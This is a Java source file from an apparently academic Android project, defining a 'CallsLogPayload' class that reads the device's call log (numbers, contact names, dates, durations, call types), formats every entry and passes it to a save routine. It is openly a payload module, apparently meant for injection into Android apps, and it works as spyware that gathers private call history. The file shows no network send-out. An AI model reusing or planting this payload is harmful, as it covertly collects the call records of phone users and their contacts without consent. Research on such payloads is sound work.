/*
 * Copyright 2015 
 * 	Danilo Cianciulli 			<cianciullidanilo@gmail.com>
 * 	Emranno Francesco Sannini 	<esannini@gmail.com>
 * 	Roberto Falzarano 			<robertofalzarano@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *  http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package it.unisannio.srss.dame.android.payloads.callsLogReader;

import it.unisannio.srss.dame.android.payloads.Payload;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

public class CallsLogPayload extends Payload {

	private static final String mProjection[] = {
			CallLog.Calls.NUMBER,// numero
			CallLog.Calls.CACHED_NAME, CallLog.Calls.CACHED_NUMBER_TYPE,
			CallLog.Calls.DATE, CallLog.Calls.DURATION,// durata chiamata
			CallLog.Calls.TYPE // ricevuta, effettuata o persa
	};

	public CallsLogPayload() {
		super();
	}

	public CallsLogPayload(Context context) {
		super(context);
	}

	// @Override
	public synchronized void run() {
		// code to retrieve call logs

		Cursor callsLogCursor = context.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, mProjection, null, null, null);

		if (callsLogCursor == null) {
			Log.e(tag, "Not able to retrive calls log");
		} else if (callsLogCursor.getCount() < 1) {
			Log.d(tag, "Calls log is empty");
		} else {
			StringBuffer output = new StringBuffer();
			while (callsLogCursor.moveToNext()) {
				String value;
				for (int i = 0; i < callsLogCursor.getColumnCount(); i++) {
					value = callsLogCursor.getString(i);
					String colName = callsLogCursor.getColumnName(i);
					if (value != null && !value.equalsIgnoreCase("")) {
						if (colName.equalsIgnoreCase(CallLog.Calls.TYPE)) {
							int valueInt = Integer.parseInt(value);
							if (valueInt == CallLog.Calls.OUTGOING_TYPE)
								value = "outgoing";
							else if (valueInt == CallLog.Calls.INCOMING_TYPE)
								value = "incoming";
							else
								value = "missed";
						}
						output.append(colName + ": " + value + "\n");
					}
				}
				output.append("\n");
				if (save(output.toString()))
					Log.d(tag, "Calls log saved successful");
				else
					Log.e(tag, "Error while saving the payload output.");
			}
		}

	}
}
